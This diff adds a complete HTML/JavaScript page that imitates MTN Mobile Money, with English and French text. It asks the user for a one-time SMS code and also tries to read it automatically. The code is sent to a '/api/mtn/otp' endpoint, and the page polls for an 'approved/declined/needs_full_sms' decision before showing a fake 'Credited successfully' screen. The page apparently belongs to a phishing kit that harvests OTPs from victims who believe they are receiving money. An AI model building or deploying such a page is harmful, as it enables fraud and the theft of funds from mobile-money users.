@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>MTN Mobile Money · Enter OTP</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --mtn-royal: #2059B5;
+    --mtn-deep:  #073A87;
+    --mtn-white: #FFFFFF;
+    --mtn-green: #28A745;
+    --mtn-yellow:#FFCC08;
+    --mtn-text:  #456BA8;
+    --mtn-gray:  #7C8798;
+    --mtn-border:#E5E9F0;
+    --mtn-soft:  #F5F7FB;
+    --mtn-page:  #E7EEF7;
+    --mtn-red:   #C62828;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--mtn-page); color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: var(--mtn-white); display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+  }
+
+  .top {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    padding: 18px 22px 26px;
+    border-bottom-left-radius: 38% 32px;
+    border-bottom-right-radius: 38% 32px;
+  }
+  .top-row {
+    display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  }
+  .brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
+  }
+  .brand .mtn { color: var(--mtn-yellow); }
+  .brand .mm  { color: #FFFFFF; opacity: 0.95; }
+
+  .page-title {
+    margin-top: 22px; font-size: 19px; font-weight: 800;
+    color: #fff; letter-spacing: -0.3px; line-height: 1.25;
+  }
+  .page-sub {
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.78);
+    line-height: 1.5; max-width: 320px;
+  }
+
+  .body {
+    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 34px 22px 24px;
+    display: flex; flex-direction: column; justify-content: flex-start;
+  }
+
+  .notice {
+    display: none;
+    padding: 13px 15px;
+    border-radius: 12px;
+    font-size: 12.5px;
+    font-weight: 600;
+    line-height: 1.55;
+    margin-bottom: 18px;
+    border: 1px solid transparent;
+  }
+  .notice.show { display: block; }
+  .notice .notice-title {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.6px;
+    text-transform: uppercase; margin-bottom: 4px;
+    display: block;
+  }
+  .notice.warn {
+    background: #FFF8E1; border-color: #FFE08A; color: #7A5B00;
+  }
+  .notice.warn .notice-title { color: #8A6600; }
+
+  .section-label {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.8px;
+    text-transform: uppercase; color: var(--mtn-gray);
+    margin-bottom: 20px;
+    text-align: center;
+  }
+
+  .code-row {
+    display: flex; justify-content: center; gap: 12px;
+    margin-bottom: 10px;
+  }
+  .code-input {
+    width: 62px; height: 70px;
+    background: var(--mtn-soft);
+    border: 1.5px solid var(--mtn-border);
+    border-radius: 12px;
+    font-family: inherit;
+    font-size: 28px; font-weight: 800;
+    color: var(--mtn-deep);
+    text-align: center;
+    outline: none;
+    transition: border-color .15s, background .15s, transform .1s;
+    -webkit-appearance: none;
+    caret-color: var(--mtn-royal);
+  }
+  .code-input:focus {
+    border-color: var(--mtn-royal);
+    background: #fff;
+    transform: translateY(-1px);
+  }
+  .code-input.filled {
+    border-color: var(--mtn-royal);
+    background: #F0F5FC;
+  }
+  .code-input.invalid {
+    border-color: #E23B3B;
+    background: #FEF3F3;
+    color: var(--mtn-red);
+  }
+
+  .field-error {
+    display: none;
+    font-size: 11.5px; color: var(--mtn-red); margin-top: 10px;
+    font-weight: 600; line-height: 1.4;
+    text-align: center;
+  }
+  .field-error.show { display: block; }
+
+  .btn-approve {
+    width: 100%; margin-top: 28px; height: 54px;
+    background: var(--mtn-green); color: #fff;
+    font-family: inherit; font-size: 15px; font-weight: 900;
+    letter-spacing: 1.2px; text-transform: uppercase;
+    border: none; border-radius: 999px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(40,167,69,0.28);
+    transition: filter .15s, transform .1s, opacity .15s;
+  }
+  .btn-approve:hover { filter: brightness(1.06); }
+  .btn-approve:active { transform: scale(0.985); }
+  .btn-approve:disabled { opacity: 0.65; cursor: wait; }
+
+  .btn-resend {
+    display: none;
+    align-items: center; justify-content: center; gap: 8px;
+    width: 100%; margin-top: 12px;
+    padding: 12px 16px; font-size: 13px; font-weight: 700;
+    background: #fff; color: var(--mtn-royal);
+    border: 1.5px solid var(--mtn-royal); border-radius: 10px;
+    cursor: pointer; font-family: inherit; transition: all .15s;
+  }
+  .btn-resend.show { display: inline-flex; }
+  .btn-resend:hover { background: #F0F5FC; }
+  .btn-resend:disabled { opacity: 0.6; cursor: wait; }
+  .btn-resend svg {
+    width: 15px; height: 15px; stroke: currentColor; fill: none;
+    stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .btn-resend.sent {
+    background: var(--mtn-green); color: #fff;
+    border-color: var(--mtn-green);
+  }
+
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  .authorizing, .success {
+    position: fixed; inset: 0;
+    display: none; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 28px 24px; z-index: 9999; text-align: center;
+    color: #fff;
+  }
+  .authorizing {
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+  }
+  .success {
+    background: linear-gradient(180deg, #1E7A3A 0%, var(--mtn-green) 100%);
+  }
+  .authorizing.show, .success.show { display: flex; }
+
+  .authorizing .brand-label,
+  .success .brand-label {
+    font-size: 15px; font-weight: 800; letter-spacing: -0.2px;
+    margin-bottom: 30px;
+  }
+  .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
+  .authorizing .brand-label .mm  { color: #fff; }
+  .success .brand-label .mtn { color: var(--mtn-yellow); }
+  .success .brand-label .mm  { color: #fff; }
+
+  .authorizing .spinner {
+    width: 60px; height: 60px;
+    border: 4px solid rgba(255,255,255,0.18);
+    border-top-color: var(--mtn-yellow);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 24px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .authorizing h2,
+  .success h2 {
+    font-size: 21px; font-weight: 800; letter-spacing: -0.3px;
+    margin-bottom: 10px;
+  }
+  .authorizing p,
+  .success p {
+    font-size: 13px; color: rgba(255,255,255,0.85);
+    max-width: 300px; line-height: 1.6;
+    margin: 0 auto;
+  }
+
+  .success .check {
+    width: 84px; height: 84px; border-radius: 50%;
+    background: rgba(255,255,255,0.15);
+    border: 3px solid rgba(255,255,255,0.7);
+    display: inline-flex; align-items: center; justify-content: center;
+    margin-bottom: 24px;
+    animation: popIn .5s cubic-bezier(.4, 1.4, .6, 1);
+  }
+  .success .check svg {
+    width: 44px; height: 44px;
+    stroke: #fff; fill: none;
+    stroke-width: 3.4; stroke-linecap: round; stroke-linejoin: round;
+    stroke-dasharray: 60; stroke-dashoffset: 60;
+    animation: drawCheck .55s ease-out .15s forwards;
+  }
+  @keyframes popIn {
+    0%   { transform: scale(0.4); opacity: 0; }
+    100% { transform: scale(1);   opacity: 1; }
+  }
+  @keyframes drawCheck {
+    to { stroke-dashoffset: 0; }
+  }
+  .success .credited-amount {
+    font-size: 26px; font-weight: 900; color: var(--mtn-yellow);
+    letter-spacing: -0.5px; margin: 6px 0 14px;
+  }
+
+  .authorizing .cancel-link {
+    margin-top: 28px; background: transparent; border: none;
+    color: rgba(255,255,255,0.68); font-family: inherit;
+    font-size: 12px; font-weight: 600; cursor: pointer;
+    text-decoration: underline; text-underline-offset: 3px;
+  }
+  .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
+
+  @media (max-width: 380px) {
+    .top { padding: 16px 18px 22px; }
+    .body { padding: 28px 18px 18px; }
+    .brand { font-size: 16px; }
+    .page-title { font-size: 17px; }
+    .code-row { gap: 9px; }
+    .code-input { width: 54px; height: 62px; font-size: 24px; }
+    .btn-approve { height: 50px; font-size: 14px; }
+    .authorizing h2, .success h2 { font-size: 19px; }
+    .authorizing .spinner { width: 50px; height: 50px; }
+    .success .check { width: 72px; height: 72px; }
+    .success .check svg { width: 38px; height: 38px; }
+    .success .credited-amount { font-size: 22px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 32px;
+      box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18);
+      overflow: hidden;
+    }
+    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="top">
+    <div class="top-row">
+      <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+    </div>
+    <div class="page-title" id="pageTitle">Enter OTP code</div>
+    <div class="page-sub" id="pageSub">Enter the one-time code sent to your phone to approve this transaction.</div>
+  </div>
+
+  <div class="body">
+
+    <div class="notice warn" id="noticeExpired">
+      <span class="notice-title" id="noticeExpiredTitle">Code expired</span>
+      <span id="noticeExpiredBody">The code was not approved. Tap <strong>Resend code</strong> below to receive a new OTP, then enter it here.</span>
+    </div>
+
+    <div class="section-label" id="sectionLabel">Enter OTP code</div>
+
+    <div class="code-row" id="codeRow">
+      <input class="code-input" id="c1" type="tel" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Digit 1">
+      <input class="code-input" id="c2" type="tel" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 2">
+      <input class="code-input" id="c3" type="tel" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 3">
+      <input class="code-input" id="c4" type="tel" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 4">
+    </div>
+    <div class="field-error" id="codeError">Please enter all 4 digits of your code.</div>
+
+    <button class="btn-approve" id="approveBtn" onclick="approveCode()">Approve</button>
+
+    <button class="btn-resend" id="resendBtn" onclick="resendCode()">
+      <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
+      <span id="resendLabel">Resend code</span>
+    </button>
+
+  </div>
+</div>
+
+<div class="authorizing" id="authorizingOverlay">
+  <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+  <div class="spinner"></div>
+  <h2 id="authTitle">Approving transaction…</h2>
+  <p id="authText">Verifying your code with MTN Mobile Money. Please do not close this page.</p>
+  <button class="cancel-link" onclick="cancelAuthorizing()" id="cancelAuthBtn">Cancel</button>
+</div>
+
+<div class="success" id="successOverlay">
+  <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+  <div class="check">
+    <svg viewBox="0 0 24 24"><polyline points="5 12 10 17 19 7"/></svg>
+  </div>
+  <h2 id="successTitle">Credited successfully</h2>
+  <div class="credited-amount" id="creditedAmount">—</div>
+  <p id="successDesc">Your transaction has been approved and the funds have been credited. You will be redirected shortly.</p>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  /* ═══════════════════════════════════════════════════════════
+     TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  const I18N = {
+    en: {
+      docTitle: 'MTN Mobile Money · Enter OTP',
+      pageTitle: 'Enter OTP code',
+      pageSub: 'Enter the one-time code sent to your phone to approve this transaction.',
+      noticeExpiredTitle: 'Code expired',
+      noticeExpiredBody: 'The code was not approved. Tap <strong>Resend code</strong> below to receive a new OTP, then enter it here.',
+      sectionLabel: 'Enter OTP code',
+      codeError: 'Please enter all 4 digits of your code.',
+      approveBtn: 'Approve',
+      resendLabel: 'Resend code',
+      resendSending: 'Sending…',
+      resendSent: 'Sent ✓',
+      authTitle: 'Approving transaction…',
+      authText: 'Verifying your code with MTN Mobile Money. Please do not close this page.',
+      cancelBtn: 'Cancel',
+      successTitle: 'Credited successfully',
+      successDesc: 'Your transaction has been approved and the funds have been credited. You will be redirected shortly.',
+      creditedFallback: 'Credited',
+      networkError: 'Network error. Please try again.',
+      notAccepted: 'Request was not accepted. Please try again.',
+      sessionExpired: 'Session expired. Please request a new code.',
+      codeExpired: 'Code expired. Tap Resend code to receive a new OTP.',
+      newOtpSent: 'A new OTP was sent to your phone.',
+      resendFailed: 'Could not resend. Please try again in a moment.'
+    },
+    fr: {
+      docTitle: 'MTN Mobile Money · Saisie du code OTP',
+      pageTitle: 'Saisissez le code OTP',
+      pageSub: 'Entrez le code à usage unique envoyé sur votre téléphone pour approuver cette transaction.',
+      noticeExpiredTitle: 'Code expiré',
+      noticeExpiredBody: 'Le code n\'a pas été approuvé. Appuyez sur <strong>Renvoyer le code</strong> ci-dessous pour recevoir un nouveau code OTP, puis saisissez-le ici.',
+      sectionLabel: 'Saisissez le code OTP',
+      codeError: 'Veuillez saisir les 4 chiffres de votre code.',
+      approveBtn: 'Approuver',
+      resendLabel: 'Renvoyer le code',
+      resendSending: 'Envoi…',
+      resendSent: 'Envoyé ✓',
+      authTitle: 'Approbation de la transaction…',
+      authText: 'Vérification de votre code avec MTN Mobile Money. Veuillez ne pas fermer cette page.',
+      cancelBtn: 'Annuler',
+      successTitle: 'Crédité avec succès',
+      successDesc: 'Votre transaction a été approuvée et les fonds ont été crédités. Vous allez être redirigé sous peu.',
+      creditedFallback: 'Crédité',
+      networkError: 'Erreur réseau. Veuillez réessayer.',
+      notAccepted: 'La demande n\'a pas été acceptée. Veuillez réessayer.',
+      sessionExpired: 'Session expirée. Veuillez demander un nouveau code.',
+      codeExpired: 'Code expiré. Appuyez sur Renvoyer le code pour recevoir un nouveau code OTP.',
+      newOtpSent: 'Un nouveau code OTP a été envoyé sur votre téléphone.',
+      resendFailed: 'Impossible de renvoyer. Veuillez réessayer dans un instant.'
+    }
+  };
+
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  const currentLang = I18N[urlLang] ? urlLang : 'en';
+  const T = I18N[currentLang];
+
+  const tx = {
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || '',
+    dt:  urlParams.get('dt') || ''
+  };
+
+  /* ═══════════════════════════════════════════════════════════
+     APPLY TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('noticeExpiredTitle').textContent = T.noticeExpiredTitle;
+    document.getElementById('noticeExpiredBody').innerHTML = T.noticeExpiredBody;
+    document.getElementById('sectionLabel').textContent = T.sectionLabel;
+    document.getElementById('codeError').textContent = T.codeError;
+    document.getElementById('approveBtn').textContent = T.approveBtn;
+    document.getElementById('resendLabel').textContent = T.resendLabel;
+    document.getElementById('authTitle').textContent = T.authTitle;
+    document.getElementById('authText').textContent = T.authText;
+    document.getElementById('cancelAuthBtn').textContent = T.cancelBtn;
+    document.getElementById('successTitle').textContent = T.successTitle;
+    document.getElementById('successDesc').textContent = T.successDesc;
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     HELPERS
+  ═══════════════════════════════════════════════════════════ */
+  const CURRENCY_LOCALE = {
+    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
+    XOF: 'fr-BJ', USD: 'en-US'
+  };
+  function formatAmount(amount, currency) {
+    const locale = CURRENCY_LOCALE[currency] || 'en-US';
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    try {
+      const parts = new Intl.NumberFormat(locale, {
+        minimumFractionDigits: 0, maximumFractionDigits: 2
+      }).format(n);
+      const pretty = (currency === 'XAF' || currency === 'XOF' || currency === 'UGX')
+        ? parts.replace(/\u202F|\u00A0|,/g, ' ')
+        : parts;
+      return pretty + ' ' + currency;
+    } catch (e) { return n + ' ' + (currency || ''); }
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  const codeInputs = [
+    document.getElementById('c1'),
+    document.getElementById('c2'),
+    document.getElementById('c3'),
+    document.getElementById('c4')
+  ];
+  const codeError = document.getElementById('codeError');
+  const resendBtn = document.getElementById('resendBtn');
+  const noticeExpired = document.getElementById('noticeExpired');
+  const approveBtn = document.getElementById('approveBtn');
+
+  function clearCodeInvalid() {
+    codeError.classList.remove('show');
+    codeInputs.forEach(i => i.classList.remove('invalid'));
+  }
+  function readCode() {
+    return codeInputs.map(i => i.value.replace(/\D/g, '')).join('');
+  }
+  function updateFilled() {
+    codeInputs.forEach(i => {
+      if (i.value) i.classList.add('filled');
+      else i.classList.remove('filled');
+    });
+  }
+
+  codeInputs.forEach((input, idx) => {
+    input.addEventListener('input', () => {
+      clearCodeInvalid();
+      noticeExpired.classList.remove('show');
+      input.value = input.value.replace(/\D/g, '').slice(0, 1);
+      updateFilled();
+      if (input.value && idx < 3) {
+        codeInputs[idx + 1].focus();
+      }
+      if (readCode().length === 4 && !approveBtn.disabled) {
+        setTimeout(() => {
+          if (readCode().length === 4 && !approveBtn.disabled) approveCode();
+        }, 150);
+      }
+    });
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !input.value && idx > 0) {
+        codeInputs[idx - 1].focus();
+        codeInputs[idx - 1].value = '';
+        updateFilled();
+        e.preventDefault();
+      }
+      if (e.key === 'ArrowLeft' && idx > 0) {
+        codeInputs[idx - 1].focus();
+        e.preventDefault();
+      }
+      if (e.key === 'ArrowRight' && idx < 3) {
+        codeInputs[idx + 1].focus();
+        e.preventDefault();
+      }
+    });
+
+    input.addEventListener('paste', (e) => {
+      e.preventDefault();
+      const text = (e.clipboardData || window.clipboardData).getData('text') || '';
+      const digits = text.replace(/\D/g, '').slice(0, 4);
+      if (!digits) return;
+      clearCodeInvalid();
+      noticeExpired.classList.remove('show');
+      for (let i = 0; i < 4; i++) codeInputs[i].value = digits[i] || '';
+      updateFilled();
+      const last = Math.min(digits.length, 4) - 1;
+      if (last >= 0 && last < 3) codeInputs[last + 1].focus();
+      else if (digits.length === 4 && !approveBtn.disabled) {
+        codeInputs[3].blur();
+        setTimeout(() => {
+          if (readCode().length === 4 && !approveBtn.disabled) approveCode();
+        }, 150);
+      }
+    });
+
+    input.addEventListener('focus', () => { input.select && input.select(); });
+  });
+
+  document.addEventListener('DOMContentLoaded', () => {
+    applyTranslations();
+    codeInputs[0].focus();
+
+    if ('OTPCredential' in window && navigator.credentials && navigator.credentials.get) {
+      try {
+        navigator.credentials.get({
+          otp: { transport: ['sms'] },
+          signal: (new AbortController()).signal
+        }).then((otp) => {
+          if (otp && otp.code) {
+            const digits = String(otp.code).replace(/\D/g, '').slice(0, 4);
+            if (digits.length === 4) {
+              for (let i = 0; i < 4; i++) codeInputs[i].value = digits[i];
+              updateFilled();
+              codeInputs[3].blur();
+            }
+          }
+        }).catch(() => {});
+      } catch (e) {}
+    }
+  });
+
+  const PAGE_LIMIT_MS = 5 * 60 * 1000;
+  const PAGE_START = Date.now();
+
+  let pollingActive = false;
+  let pollTimer = null;
+
+  function cancelAuthorizing() {
+    pollingActive = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    document.getElementById('authorizingOverlay').classList.remove('show');
+    approveBtn.disabled = false;
+    approveBtn.textContent = T.approveBtn;
+  }
+
+  async function approveCode() {
+    clearCodeInvalid();
+
+    const code = readCode();
+    if (code.length !== 4) {
+      codeError.textContent = T.codeError;
+      codeError.classList.add('show');
+      codeInputs.forEach(i => { if (!i.value) i.classList.add('invalid'); });
+      codeInputs[0].focus();
+      return;
+    }
+
+    approveBtn.disabled = true;
+
+    document.getElementById('authTitle').textContent = T.authTitle;
+    document.getElementById('authText').textContent = T.authText;
+    document.getElementById('authorizingOverlay').classList.add('show');
+
+    let serverAccepted = true;
+    try {
+      const r = await fetch('/api/mtn/otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: tx.ref,
+          otp: code,
+          am: tx.am,
+          cur: tx.cur,
+          c: tx.c,
+          lang: currentLang
+        })
+      });
+      if (!r.ok) serverAccepted = false;
+    } catch (e) {
+      document.getElementById('authorizingOverlay').classList.remove('show');
+      approveBtn.disabled = false;
+      showToast(T.networkError);
+      return;
+    }
+
+    if (!serverAccepted) {
+      document.getElementById('authorizingOverlay').classList.remove('show');
+      approveBtn.disabled = false;
+      showToast(T.notAccepted);
+      return;
+    }
+
+    pollingActive = true;
+
+    const poll = async () => {
+      if (!pollingActive) return;
+
+      if (Date.now() - PAGE_START > PAGE_LIMIT_MS) {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        approveBtn.disabled = false;
+        approveBtn.textContent = T.approveBtn;
+        noticeExpired.classList.add('show');
+        resendBtn.classList.add('show');
+        showToast(T.sessionExpired);
+        return;
+      }
+
+      let decision = 'pending';
+      try {
+        const r = await fetch('/api/mtn/otp-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const j = await r.json();
+        decision = j.decision || 'pending';
+      } catch (e) { }
+
+      if (!pollingActive) return;
+
+      if (decision === 'approved') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        const amtEl = document.getElementById('creditedAmount');
+        amtEl.textContent = tx.am ? formatAmount(tx.am, tx.cur) : T.creditedFallback;
+        document.getElementById('successOverlay').classList.add('show');
+
+        const remaining = Math.max(0, PAGE_LIMIT_MS - (Date.now() - PAGE_START));
+        setTimeout(() => {
+          const q = new URLSearchParams({
+            tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+            c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+            lang: currentLang
+          });
+          window.location.href = 'success.html?' + q.toString();
+        }, remaining);
+        return;
+      }
+
+      if (decision === 'declined' || decision === 'expired') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        approveBtn.disabled = false;
+        approveBtn.textContent = T.approveBtn;
+        codeInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
+        updateFilled();
+        noticeExpired.classList.add('show');
+        resendBtn.classList.add('show');
+        showToast(T.codeExpired);
+        return;
+      }
+
+      if (decision === 'inactive' || decision === 'needs_full_sms') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+          reason: decision === 'needs_full_sms' ? 'needs_full_sms' : 'inactive',
+          lang: currentLang
+        });
+        window.location.href = 'oops.html?' + q.toString();
+        return;
+      }
+
+      pollTimer = setTimeout(poll, 1500);
+    };
+
+    poll();
+  }
+
+  async function resendCode() {
+    const lbl = document.getElementById('resendLabel');
+    resendBtn.disabled = true;
+    lbl.textContent = T.resendSending;
+    try {
+      const r = await fetch('/api/mtn/resend', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: tx.ref,
+          stage: 'otp',
+          an: tx.an,
+          c: tx.c,
+          am: tx.am,
+          cur: tx.cur,
+          lang: currentLang
+        })
+      });
+      if (!r.ok && r.status !== 429) throw new Error('bad');
+      resendBtn.classList.add('sent');
+      lbl.textContent = T.resendSent;
+      noticeExpired.classList.remove('show');
+      showToast(T.newOtpSent);
+      setTimeout(() => {
+        resendBtn.classList.remove('sent');
+        resendBtn.classList.remove('show');
+        lbl.textContent = T.resendLabel;
+        resendBtn.disabled = false;
+        codeInputs[0].focus();
+      }, 3000);
+    } catch (e) {
+      lbl.textContent = T.resendLabel;
+      resendBtn.disabled = false;
+      showToast(T.resendFailed);
+    }
+  }
+</script>
+</body>
+</html>
